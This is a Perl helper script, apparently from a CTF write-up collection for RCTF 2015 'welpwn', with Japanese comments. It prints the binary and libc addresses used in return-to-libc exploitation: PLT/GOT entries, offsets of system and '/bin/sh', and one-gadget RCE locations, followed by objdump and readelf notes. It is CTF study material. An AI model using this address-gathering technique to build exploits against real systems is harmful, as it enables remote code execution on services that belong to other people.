#
# RCTF 2015 Quals - welpwn 200
#
# Copyright (c) 2014-2019 gpp256
# This software is distributed under the MIT License.

use pwntools;
# libcのバージョンを特定できた場合、以下などからダウンロード可能
# https://launchpad.net/ubuntu/+source/glibc/
# e.g. Ubuntu GLIBC 2.24-3ubuntu2の場合
# curl -o - https://launchpad.net/ubuntu/+source/glibc/2.24-3ubuntu2/ 2>/dev/null| grep '+build'
#  <a href="/ubuntu/+source/glibc/2.24-3ubuntu2/+build/11213410">amd64</a> : x86-64版はここから取得可能
# curl -o - https://launchpad.net/ubuntu/yakkety/amd64/libc6/2.24-3ubuntu2 2>/dev/null | grep .deb\" | awk -F \" '{print $2}'
# http://launchpadlibrarian.net/293727628/libc6_2.24-3ubuntu2_amd64.deb # wget/curlで取得
# 展開方法: dpkg-deb -x libc6_2.24-3ubuntu2_amd64.deb ./temp; find . -name "libc*.so"

if (@ARGV==1) {
printf("-- $ARGV[0] --\n");
$o = new elfinfo(file => $ARGV[0]);
printf("\$start_addr=0x%x;\n",		$o->function('_start'));
printf("\$main_addr=0x%x;\n",		$o->function('main'));
printf("\$binsh_offset=0x%x;\n",	$o->search('/bin/sh'));
printf("\$printf_plt=0x%x;\n",		$o->plt('printf'));
printf("\$lsm_got=0x%x;\n",		$o->got('__libc_start_main'));
printf("\$bss_addr=0x%x;\n",		$o->bss());
print "\n\n"
}

print "-- x86-64 --\n";
$libc = new elfinfo(file => '/lib/x86_64-linux-gnu/libc.so.6'); # 解析環境に合わせて要修正
printf("\$system_offset=0x%x;\n",	$libc->function('system'));
printf("\$execl_offset=0x%x;\n",	$libc->function('execl'));
printf("\$open_offset=0x%x;\n",		$libc->function('open'));
printf("\$read_offset=0x%x\n",		$libc->function('read'));
printf("\$write_offset=0x%x;\n",	$libc->function('write'));
printf("\$environ_offset=0x%x;\n",	$libc->function('__environ'));
printf("\$lsm_offset=0x%x;\n",		$libc->function('__libc_start_main'));
printf("\$binsh_offset=0x%x;\n", 	$libc->search('/bin/sh'));
$libc->set_location('system', 0x7ffff003d0);
printf("\$base_addr=0x%x;\n",		$libc->base_addr);
printf("\$system_addr=0x%x;\n",		$libc->function('system'));
@addrs = $libc->rce();
if (@addrs > 0) {
map { printf("\$rce_offset=0x%x;\n", $_); } @addrs;
}
$libc = undef;

printf("\n-- x86 --\n");
$libc = new elfinfo(file => '/lib/i386-linux-gnu/libc.so.6'); # 解析環境に合わせて要修正
printf("\$system_offset=0x%x;\n",	$libc->function('system'));
printf("\$read_offset=0x%x\n",		$libc->function('read'));
printf("\$write_offset=0x%x;\n",	$libc->function('write'));
printf("\$environ_offset=0x%x;\n",	$libc->function('__environ'));
printf("\$lsm_offset=0x%x;\n",		$libc->function('__libc_start_main'));
printf("\$binsh_offset=0x%x;\n", 	$libc->search('/bin/sh'));
@addrs = $libc->rce();
if (@addrs > 0) {
map { printf("\$rce_offset=0x%x;\n", $_); } @addrs;
}
__END__
$ objdump -d -Mintel tp | grep ^0
0000000000400400 <_start>:
0000000000400502 <main>:

$ strings -tx -a tp
    594 /bin/sh

# objdump -d -j.plt tp
0000000000400400 <printf@plt-0x10>:

# readelf -r tp
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 printf + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 __libc_start_main + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 __gmon_start__ + 0

# readelf -S tp 
  [25] .bss              NOBITS           0000000000601048  00001048
  [25] .bss              NOBITS          0804a024 001024 000004 00  WA  0   0  1

# file -bL /lib/x86_64-linux-gnu/libc.so.6
ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked (uses shared libs), 
# nm -D /lib/x86_64-linux-gnu/libc.so.6|grep system
00000000000443d0 W system

# file -bL /lib/x86_64-linux-gnu/libc.so.6
ELF 64-bit LSB shared object
# objdump -d -Mintel /lib/x86_64-linux-gnu/libc.so.6 | grep -A 2 -B 9 -e execve
   442aa:       48 8b 05 f7 fb 37 00    mov    rax,QWORD PTR [rip+0x37fbf7]        # 3c3ea8 <_IO_file_jumps+0x668>
   442b1:       48 8d 3d 25 81 14 00    lea    rdi,[rip+0x148125]        # 18c3dd <_libc_intl_domainname+0x1b4>
   442b8:       48 8d 74 24 30          lea    rsi,[rsp+0x30]
   442bd:       c7 05 79 23 38 00 00    mov    DWORD PTR [rip+0x382379],0x0        # 3c6640 <__abort_msg+0x8e0>
   442c4:       00 00 00
   442c7:       c7 05 73 23 38 00 00    mov    DWORD PTR [rip+0x382373],0x0        # 3c6644 <__abort_msg+0x8e4>
   442ce:       00 00 00
   442d1:       48 8b 10                mov    rdx,QWORD PTR [rax]
   442d4:       e8 67 6d 08 00          call   cb040 <execve>
--
   f0840:       48 8b 05 61 36 2d 00    mov    rax,QWORD PTR [rip+0x2d3661]        # 3c3ea8 <_IO_file_jumps+0x668>
   f0847:       48 8d 74 24 50          lea    rsi,[rsp+0x50]
   f084c:       48 8d 3d 8a bb 09 00    lea    rdi,[rip+0x9bb8a]        # 18c3dd <_libc_intl_domainname+0x1b4>
   f0853:       48 8b 10                mov    rdx,QWORD PTR [rax]
   f0856:       e8 e5 a7 fd ff          call   cb040 <execve>
--
   f170d:       48 8b 05 94 27 2d 00    mov    rax,QWORD PTR [rip+0x2d2794]        # 3c3ea8 <_IO_file_jumps+0x668>
   f1714:       48 8d 74 24 70          lea    rsi,[rsp+0x70]
   f1719:       48 8d 3d bd ac 09 00    lea    rdi,[rip+0x9acbd]        # 18c3dd <_libc_intl_domainname+0x1b4>
   f1720:       48 8b 10                mov    rdx,QWORD PTR [rax]
   f1723:       e8 18 99 fd ff          call   cb040 <execve>

# file -bL /lib/i386-linux-gnu/libc.so.6
ELF 32-bit LSB shared object
# objdump -d -Mintel /lib/i386-linux-gnu/libc.so.6 | grep -A 2 -B 12 -e execve
   3b03b:       8b 83 48 ff ff ff       mov    eax,DWORD PTR [ebx-0xb8]
   3b041:       83 c4 0c                add    esp,0xc
   3b044:       c7 83 40 18 00 00 00    mov    DWORD PTR [ebx+0x1840],0x0
   3b04b:       00 00 00
   3b04e:       c7 83 44 18 00 00 00    mov    DWORD PTR [ebx+0x1844],0x0
   3b055:       00 00 00
   3b058:       ff 30                   push   DWORD PTR [eax]
   3b05a:       8d 44 24 2c             lea    eax,[esp+0x2c]
   3b05e:       50                      push   eax
   3b05f:       8d 83 db 85 fa ff       lea    eax,[ebx-0x57a25]
   3b065:       50                      push   eax
   3b066:       e8 45 87 07 00          call   b37b0 <execve>

# perl getaddr.pl
[+] _start addr=0x8048320
[+] main addr=0x8048425
[+] /bin/sh offset=0x4e0
[+] printf@plt addr=0x80482f0
[+] lsm@got addr=0x804a014
[+] bss addr=0x804a024
[+] system offset=0x443d0
[+] execl offset=0xcb2e0
[+] open offset=0xf7260
[+] read offset=0xf7470
[+] write offset=0xf74d0
[+] __environ offset=0x3c7218
[+] lsm offset=0x20950
[+] /bin/sh offset=0x18c3dd
[+] one-gadget-rce x64 offset=0x442a5
[+] one-gadget-rce x64 offset=0xf0840
[+] one-gadget-rce x64 offset=0xf170d
[+] one-gadget-rce x86 offset=0x3b03b

